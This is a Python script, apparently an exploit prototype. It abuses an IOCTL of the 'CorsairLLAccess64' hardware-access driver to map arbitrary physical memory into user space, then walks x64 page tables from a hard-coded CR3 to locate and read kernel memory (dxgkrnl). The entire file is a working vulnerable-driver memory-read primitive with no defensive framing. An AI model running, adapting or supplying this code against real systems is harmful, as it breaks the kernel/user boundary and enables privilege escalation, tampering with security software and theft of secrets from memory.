
import ctypes
import struct

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000
PTE_PHYS_MASK = 0x000FFFFFFFFFF000
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa &= ~0xFFF
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def read8(h, pa):
    v = map_page(h, pa & ~0xFFF)
    if not v: return None
    return struct.unpack("<Q", bytes((ctypes.c_ubyte * 8).from_address(v + (pa & 0xFFF))))[0]

def kva_to_pa(h, kva, cr3):
    idxs = [
        (kva >> 39) & 0x1FF,
        (kva >> 30) & 0x1FF,
        (kva >> 21) & 0x1FF,
        (kva >> 12) & 0x1FF
    ]
    
    # PML4
    pml4e = read8(h, (cr3 & PTE_PHYS_MASK) + idxs[0] * 8)
    if pml4e is None or not (pml4e & 1): 
        print(f"[-] PML4 Miss at idx {idxs[0]}")
        return None
    
    # PDPT
    pdpte = read8(h, (pml4e & PTE_PHYS_MASK) + idxs[1] * 8)
    if pdpte is None or not (pdpte & 1):
        print(f"[-] PDPT Miss at idx {idxs[1]}")
        return None
    if pdpte & 0x80: # 1GB page
        return (pdpte & 0x000FFFFFC0000000) + (kva & 0x3FFFFFFF)
        
    # PD
    pde = read8(h, (pdpte & PTE_PHYS_MASK) + idxs[2] * 8)
    if pde is None or not (pde & 1):
        print(f"[-] PD Miss at idx {idxs[2]}")
        return None
    if pde & 0x80: # 2MB page
        return (pde & 0x000FFFFFFFE00000) + (kva & 0x1FFFFF)
        
    # PT
    pte = read8(h, (pde & PTE_PHYS_MASK) + idxs[3] * 8)
    if pte is None or not (pte & 1):
        print(f"[-] PT Miss at idx {idxs[3]}")
        return None
        
    return (pte & PTE_PHYS_MASK) + (kva & 0xFFF)

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return
    
    CR3 = 0x1AE000
    DXG_VA = 0xfffff80551890000
    
    print(f"[*] Walking KVA 0x{DXG_VA:X} with CR3 0x{CR3:X}...")
    pa = kva_to_pa(h, DXG_VA, CR3)
    if pa:
        print(f"[+] dxgkrnl Physical Address: 0x{pa:X}")
        v = map_page(h, pa)
        if v:
            data = bytes((ctypes.c_ubyte * 2).from_address(v + (pa & 0xFFF)))
            print(f"[+] Data at PA: {data}")
    else:
        print("[-] Translation failed")
        
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
